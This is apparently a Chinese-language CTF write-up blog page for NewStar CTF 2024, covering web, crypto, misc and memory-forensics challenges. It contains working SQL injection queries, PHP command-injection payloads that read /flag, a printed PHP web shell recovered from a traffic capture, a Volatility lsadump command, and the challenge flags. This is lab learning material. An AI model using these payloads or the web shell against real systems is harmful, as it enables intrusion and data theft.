@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="一直想复现NewStar CTF 2024 的题目，一直....有点忙（六级+期末），但还是抽时间好好复现了一部分WP。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NewStar CTF 2024 WP">
+<meta property="og:url" content="http://example.com/2024/12/11/NewStar%20CTF%202024%20WP/index.html">
+<meta property="og:site_name" content="F0T1-CTF">
+<meta property="og:description" content="一直想复现NewStar CTF 2024 的题目，一直....有点忙（六级+期末），但还是抽时间好好复现了一部分WP。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241124163204254.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241124162912684.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241124163305229.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241124163647915.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241124163733992.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211111556119.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211111706750.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211111800573.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211114135096.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211114219525.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211161847432.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211161957294.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211162050698.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211171135960.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211170936786.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211204705044.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211204853792.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211204923601.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211205050081.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211205204100.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211205247446.png">
+<meta property="article:published_time" content="2024-12-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-11T13:22:16.577Z">
+<meta property="article:author" content="CTF-DUAN">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241124163204254.png">
+
+<link rel="canonical" href="http://example.com/2024/12/11/NewStar%20CTF%202024%20WP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>NewStar CTF 2024 WP | F0T1-CTF</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">F0T1-CTF</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">从0到1CTFer成长之路</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/11/NewStar%20CTF%202024%20WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/logo.jpg">
+      <meta itemprop="name" content="CTF-DUAN">
+      <meta itemprop="description" content="CTF学习">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="F0T1-CTF">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          NewStar CTF 2024 WP
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-12-11 00:00:00 / 修改时间：21:22:16" itemprop="dateCreated datePublished" datetime="2024-12-11T00:00:00+08:00">2024-12-11</time>
+            </span>
+
+          
+            <div class="post-description">一直想复现NewStar CTF 2024 的题目，一直....有点忙（六级+期末），但还是抽时间好好复现了一部分WP。</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="NewStar-CTF-2024"><a href="#NewStar-CTF-2024" class="headerlink" title="NewStar CTF 2024"></a>NewStar CTF 2024</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>赛后托管上线到西电的CTF终端了</p>
+<p><a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/14?challenge=568">https://ctf.xidian.edu.cn/training/14?challenge=568</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241124163204254.png" alt="image-20241124163204254"></p>
+<img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241124162912684.png" alt="image-20241124162912684" style="zoom:80%;" />
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241124163305229.png" alt="image-20241124163305229"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241124163647915.png" alt="image-20241124163647915"></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="会赢吗"><a href="#会赢吗" class="headerlink" title="会赢吗"></a><strong>会赢吗</strong></h3><p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241124163733992.png" alt="image-20241124163733992"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$reversed_cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>) - <span class="number">1</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) &#123;</span><br><span class="line">        <span class="variable">$reversed_cmd</span> .= <span class="variable">$b</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$reversed_cmd</span>);</span><br><span class="line">    <span class="variable">$d</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$d</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;cmd=&quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;&amp;key=&quot;</span>.<span class="variable">$d</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,database()#</span><br><span class="line"></span><br><span class="line">Name: &quot;1&quot;</span><br><span class="line">Position: &quot;ctf&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class="line"></span><br><span class="line">Name: &quot;1&quot;</span><br><span class="line">Position: &quot;Fl4g,hexo&quot;</span><br><span class="line"></span><br><span class="line">-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;Fl4g&#x27; and table_schema=database()#</span><br><span class="line"></span><br><span class="line">-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database()#</span><br><span class="line"></span><br><span class="line">Name: &quot;1&quot;</span><br><span class="line">Position: &quot;id,des,value,id,uname,position&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1 union select group_concat(des),group_concat(value) from Fl4g#</span><br><span class="line"></span><br><span class="line">Name: &quot;C0ngratu1ati0ns!&quot;</span><br><span class="line">Position: &quot;flag&#123;n3wsTAr-CTF-Z0241736b25275b5&#125;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h3><p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211111556119.png" alt="image-20241211111556119"></p>
+<p>访问WWW.zip自动下载</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211111706750.png" alt="image-20241211111706750"></p>
+<p>数组绕过加正则</p>
+<p>eval，RCE即可</p>
+<p>在 PHP 中，<code>eval()</code> 是一个非常危险的函数，它可以<strong>执行任意的 PHP 代码。</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211111800573.png" alt="image-20241211111800573"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">读取文件内容</span><br><span class="line">tac more less head tail</span><br><span class="line"></span><br><span class="line">绕过正则</span><br><span class="line">1 通配符 * </span><br><span class="line">2 字符拼接 . </span><br><span class="line"></span><br><span class="line">file_get_contents(&quot;/flag&quot;) 尝试读取 /flag 文件的内容。如果该文件存在且 PHP 有权限读取它，它会返回文件的内容。</span><br><span class="line">system() 函数执行操作系统的命令。</span><br><span class="line"></span><br><span class="line">star[]=2&amp;&amp;cmd=system(&#x27;tac /fla*&#x27;);</span><br><span class="line">star[]=2&amp;&amp;cmd=system(&#x27;more /fla*&#x27;);</span><br><span class="line">star[]=2&amp;&amp;cmd=system(&#x27;less /fla*&#x27;);</span><br><span class="line">star[]=2&amp;&amp;cmd=system(&#x27;head /fla*&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">star[]=2&amp;&amp;cmd=echo file_get_contents(&quot;/fla&quot;.&quot;g&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211114135096.png" alt="image-20241211114135096"></p>
+<p>上fenjing即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211114219525.png" alt="image-20241211114219525"></p>
+<h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/MYMOTOE6/article/details/141130572">从小白变RSA大神，附常用工具使用方法及CTF中RSA典型例题_ctf rsa工具-CSDN博客</a></p>
+<h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> serct <span class="keyword">import</span> flag</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = powmod(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span></span><br><span class="line"><span class="comment"># 48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>分解N</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211161847432.png" alt="image-20241211161847432"></p>
+<p>获得P,Q</p>
+<p>填入e，c</p>
+<p>计算私钥d</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211161957294.png" alt="image-20241211161957294"></p>
+<p>计算出明文后转字符即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211162050698.png" alt="image-20241211162050698"></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="php混淆加密"><a href="#php混淆加密" class="headerlink" title="php混淆加密"></a>php混淆加密</h3><p>分析流量包，都是http流量，导出http对象</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211171135960.png" alt="image-20241211171135960"></p>
+<p>upload.php 文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$payload</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>];</span><br><span class="line">    <span class="variable">$payload</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$payload</span>);</span><br><span class="line">    <span class="variable">$bbb</span>=<span class="title function_ invoke__">create_function</span>(</span><br><span class="line">        <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;J&#x27;</span>.<span class="title function_ invoke__">str_rot13</span>(<span class="string">&#x27;T&#x27;</span>).<span class="string">&#x27;5z&#x27;</span>),   </span><br><span class="line">        <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;JG5zPWJhc2U2NF9lbmNvZGUoJG5zKTsNCmZvcigkaT0wOyRpPHN0cmxlbigkbnMpOyRp</span></span><br><span class="line"><span class="string">        Kz0xKXsNCiAgICBpZigkaSUy&#x27;</span>.<span class="title function_ invoke__">str_rot13</span>(<span class="string">&#x27;CG0kXKfAPvNtVPNtVPNtWT5mJlEcKG1m&#x27;</span>).<span class="string">&#x27;dHJfcm90MTMoJG5zWyRpXSk7DQo</span></span><br><span class="line"><span class="string">        gICAgfQ0KfQ0KcmV0dXJuICRuczs==&#x27;</span>)   </span><br><span class="line">    );  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$bbb</span>(<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>以及两个字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ZzxuZ3tmSQNsaGRsUmBsNzVOdKQkZaVZLa0tCt==</span><br><span class="line"></span><br><span class="line">ZzFeZKt0aTlmX2lmX2Zua2VsZzFfZ30tCt==</span><br></pre></td></tr></table></figure>
+
+<p>php代码混淆，按照提示进行解密即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CG0kXKfAPvNtVPNtVPNtWT5mJlEcKG1m</span><br><span class="line">ROT13后：</span><br><span class="line">PT0xKXsNCiAgICAgICAgJG5zWyRpXT1z</span><br><span class="line"></span><br><span class="line">JG5zPWJhc2U2NF9lbmNvZGUoJG5zKTsNCmZvcigkaT0wOyRpPHN0cmxlbigkbnMpOyRp</span><br><span class="line">        Kz0xKXsNCiAgICBpZigkaSUy</span><br><span class="line">        PT0xKXsNCiAgICAgICAgJG5zWyRpXT1z</span><br><span class="line">        dHJfcm90MTMoJG5zWyRpXSk7DQo</span><br><span class="line">        gICAgfQ0KfQ0KcmV0dXJuICRuczs==</span><br></pre></td></tr></table></figure>
+
+<p>base64解码后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ns=base64_encode($ns);</span><br><span class="line"></span><br><span class="line">for($i=0;$i&lt;strlen($ns);$i+=1)&#123;</span><br><span class="line"></span><br><span class="line">    if($i%2==1)&#123;</span><br><span class="line"></span><br><span class="line">        $ns[$i]=str_rot13($ns[$i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return $ns;</span><br></pre></td></tr></table></figure>
+
+<p>ns应该是前边给的字符串</p>
+<p>解密逻辑是：</p>
+<p>先base64</p>
+<p>后将奇数位进行rot13加密</p>
+<p>反向解密一下即可</p>
+<p>先将奇数位进行rot13解密</p>
+<p>在base64解码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211170936786.png" alt="image-20241211170936786"></p>
+<p>两个字符串，一真一假</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rot13</span>(<span class="params">text</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            <span class="comment"># 字母在 a-z 范围内，进行 ROT13 变换</span></span><br><span class="line">            result.append(<span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + <span class="number">13</span>) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;A&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            <span class="comment"># 字母在 A-Z 范围内，进行 ROT13 变换</span></span><br><span class="line">            result.append(<span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + <span class="number">13</span>) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 非字母字符保持不变</span></span><br><span class="line">            result.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_string</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="comment"># 对奇数位置的字符进行 ROT13 解密</span></span><br><span class="line">    modified_str = <span class="built_in">list</span>(input_str)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 奇数位从0开始，应该是索引为1, 3, 5, ...的字符</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(modified_str), <span class="number">2</span>):</span><br><span class="line">        modified_str[i] = rot13(modified_str[i])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将修改后的字符串组合成新的字符串</span></span><br><span class="line">    modified_str = <span class="string">&#x27;&#x27;</span>.join(modified_str)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 进行 Base64 解码</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_bytes = base64.b64decode(modified_str)</span><br><span class="line">        <span class="keyword">return</span> decoded_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Base64 解码失败: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例使用</span></span><br><span class="line">input_str = <span class="string">&quot;ZzxuZ3tmSQNsaGRsUmBsNzVOdKQkZaVZLa0tCt==&quot;</span> </span><br><span class="line">output = process_string(input_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;处理后的结果:&quot;</span>, output)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="内存分析"><a href="#内存分析" class="headerlink" title="内存分析"></a>内存分析</h3><p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211204705044.png" alt="image-20241211204705044"></p>
+<p>看来要根据内存分析获取开机密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211204853792.png" alt="image-20241211204853792"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211204923601.png" alt="image-20241211204923601"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vol.exe -f image.raw imageinfo</span><br><span class="line"></span><br><span class="line"> Win7SP1x86_23418, Win7SP0x86, Win7SP1x86</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211205050081.png" alt="image-20241211205050081"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vol.exe -f image.raw --profile=Win7SP1x86_23418 lsadump</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211205204100.png" alt="image-20241211205204100"></p>
+<p>注意：最开始的H不是</p>
+<p>将点去掉</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh</span><br><span class="line"></span><br><span class="line">flag&#123;ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh&#125;</span><br></pre></td></tr></table></figure>
+
